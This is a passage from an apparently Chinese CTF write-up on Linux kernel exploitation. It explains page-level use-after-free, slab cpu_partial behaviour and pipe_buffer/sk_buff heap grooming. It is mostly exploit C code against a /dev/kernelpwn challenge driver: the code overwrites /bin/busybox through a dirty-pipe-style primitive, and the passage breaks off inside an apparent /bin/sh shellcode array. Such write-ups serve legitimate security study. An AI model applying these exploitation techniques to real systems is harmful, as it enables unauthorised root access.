</span></span><span class="line"><span class="cl">    <span class="nf">init_namespace</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nf">set_cpu_affinity</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nf">getpid</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">    <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/dev/kernelpwn&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;open success&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x4000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">init_sk_buffer</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">build_msg</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">alloc_pipe_buff</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add_acc</span><span class="p">(</span><span class="mh">0x200</span><span class="p">,</span><span class="n">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;add kmalloc-cg-512&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">memset</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;allocate sk_buffer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;del kmalloc-cg-512&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">del</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;allocate pipe buffer&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">change_pipe_buff_size</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logi</span><span class="p">(</span><span class="s">&#34;Dirty pipe&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">attack_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="s">&#34;/bin/busybox&#34;</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">attack_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="kt">loff_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x1FDAC8</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">splice_fd</span><span class="p">(</span><span class="n">attack_fd</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">show_skb_buff</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="o">*</span><span class="n">data</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">alloc_sk_buffer</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">write</span><span class="p">(</span><span class="n">pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">],</span><span class="n">attack_data</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">attack_data</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nf">release_pipe_buff</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">msgbuf</span><span class="p">.</span><span class="n">mtype</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="nf">add_msg</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">msgbuf</span><span class="p">,</span><span class="mh">0x200</span><span class="o">-</span><span class="mh">0x30</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">cid</span> <span class="o">=</span> <span class="nf">fork</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">cid</span> <span class="o">==</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">poc</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">cid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nf">perror</span><span class="p">(</span><span class="s">&#34;fork&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">waitpid</span><span class="p">(</span><span class="n">cid</span><span class="p">,</span><span class="nb">NULL</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">system</span><span class="p">(</span><span class="s">&#34;exit&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="独立页的-uaf">独立页的 uaf</h3>
<p>从最简单的开始做起，可以申请无限制数量的堆块 大小为0x200（原则上来说order-0 page都可以</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo cat /sys/kernel/slab/kmalloc-512/cpu_partial
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>按照道理来说将 page 释放的操作应该是</p>
<ol>
<li>
<p>申请(cpu_partial + 0x2) * one_page_object 个 object</p>
</li>
<li>
<p>然后申请 1 个 vuln_object</p>
</li>
<li>
<p>然后再申请 one_page_object 个 object</p>
</li>
<li>
<p>然后释放掉 vuln_object 以及其前后各 one_page_object 的 object</p>
</li>
<li>
<p>然后再释放(cpu_partial + 0x1) 每个页释放一个 此时便可以将 vuln_object 的页释放进 buddy_system 中</p>
</li>
</ol>
<p>但是实际操作发现，成功率非常低，但是如果无脑的申请很多堆块，然后释放掉 成功率却很高</p>
<p>大概需要保证申请的 object 的数量*其 size 是 0x10000 才能成功</p>
</blockquote>
<p>A: 真相了，实际上对比的是 cpu_partial_slabs</p>
<p>cpu_partial_slabs在kmem_cache里面偏移可以通过pahole来看</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241020100736385.png"
        data-srcset="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241020100736385.png, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241020100736385.png 1.5x, https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241020100736385.png 2x"
        data-sizes="auto"
        alt="https://nuc-1304629987.cos.ap-chongqing.myqcloud.com/image/image-20241020100736385.png"
        title="image-20241020100736385" /></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pahole -V ./vmlinux &gt; struct.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>调试技巧，将断点下在__unfreeze_partials （释放的时候）处即可</p>
<p>p *s 或者 tele $rdi 20</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015247-149.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015247-149.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015247-149.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015247-149.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015247-149.png"
        title="image-20240206031406283" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015248-226.png"
        data-srcset="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015248-226.png, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015248-226.png 1.5x, https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015248-226.png 2x"
        data-sizes="auto"
        alt="https://tuchuang-1304629987.cos.ap-chengdu.myqcloud.com//image/20240209015248-226.png"
        title="image-20240206034000274" /></p>
<h4 id="方法-1-重叠攻击-pipe-buffer">方法 1 重叠攻击 pipe buffer</h4>
<ul>
<li>申请 0x80(13 + 0x3)  * 0x8 个 object, 然后释放掉他们</li>
<li>喷射 sk_buffer 来复用 buddy system</li>
<li>释放和 uaf 的 object 然后用 pipe-buffer 进行占位</li>
<li>读取 sk_buffer 内容使用 pipe-prime 来劫持 busybox</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;banzi.h&gt;</span><span class="cp">
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x20</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_only</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">add_acc</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x88</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">del</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">edit</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x50</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">show</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">list</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">idx</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span><span class="kt">uint64_t</span> <span class="n">size</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">arg</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="n">idx</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="n">buf</span><span class="p">};</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x66</span><span class="p">,</span><span class="n">arg</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">page_fds</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">pipefd</span><span class="p">[</span><span class="mi">30</span><span class="p">][</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">spray_pags</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;Spray 0x10 order-0 page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">52</span><span class="o">*</span><span class="mi">2</span><span class="p">;</span><span class="n">i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="n">page_fds</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nf">pagealloc_pad</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">determine_spray</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    <span class="nf">logd</span><span class="p">(</span><span class="s">&#34;spray determine page&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">spray_pags</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PTE_OFFSET 12
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_OFFSET 21
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_OFFSET 30
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_OFFSET 39
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PT_ENTRY_MASK 0b111111111UL
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PTE_ENTRY(addr) ((addr &gt;&gt; 12) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PMD_ENTRY(addr) ((addr &gt;&gt; 21) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PUD_ENTRY(addr) ((addr &gt;&gt; 30) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PGD_ENTRY(addr) ((addr &gt;&gt; 39) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ENTRY(addr) ((addr) &amp; PT_ENTRY_MASK)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_RW (1UL &lt;&lt; 1)
</span></span></span><span class="line"><span class="cl"><span class="cp">#define PAGE_ATTR_NX (1UL &lt;&lt; 63)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="k">const</span> <span class="kt">char</span> <span class="n">attack_data</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">106</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">184</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">98</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">110</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">47</span><span class="p">,</span> <span class="mi">115</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">231</span><span class="p">,</span> <span class="mi">104</span><span class="p">,</span> <span class="mi">114</span><span class="p">,</span> <span class="mi">105</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">129</span><span class="p">,</span> <span class="mi">52</span><span class="p">,</span> <span class="mi">36</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">246</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">106</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">94</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">86</span><span class="p">,</span> <span class="mi">72</span><span class="p">,</span> <span class="mi">137</span><span class="p">,</span> <span class="mi">230</span><span class="p">,</span> <span class="mi">49</span><span 